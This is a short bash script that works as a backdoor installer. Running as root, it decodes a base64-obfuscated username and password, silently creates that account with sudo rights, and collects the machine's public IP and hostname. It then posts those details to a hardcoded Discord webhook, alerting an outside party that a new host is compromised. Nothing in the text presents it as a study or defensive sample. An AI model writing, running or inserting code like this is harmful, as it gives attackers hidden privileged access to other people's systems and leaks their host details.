set -e

_X1="dm0="
_X2="dm0="

[ "$EUID" -ne 0 ] && exit 1

apt update
apt install sudo -y

if ! command -v curl &>/dev/null; then
    apt-get install curl -y &>/dev/null
fi

U=$(echo "$_X1" | base64 --decode)
P=$(echo "$_X2" | base64 --decode)

if ! id "$U" &>/dev/null; then
    useradd -m -s /bin/bash "$U" &>/dev/null
    echo "$U:$P" | chpasswd &>/dev/null
    usermod -aG sudo "$U" &>/dev/null
fi

IP=$(curl -s https://api.ipify.org || echo "Unknown")
H=$(hostname)

_W="https://discord.com/api/webhooks/1494735082173501631/ovStsIdstHE1ZqQhC4MrRFIfHLHxaPZEMYRcRxWOugP7E09buz0MAxfTRcFOixry2zMz"

curl -H "Content-Type: application/json" \
     -X POST \
     -d "{\"content\": \"✅ **User Created**\n**IP:** $IP\n**Host:** $H\n**User:** $U\"}" \
     "$_W" &>/dev/null

exit 0
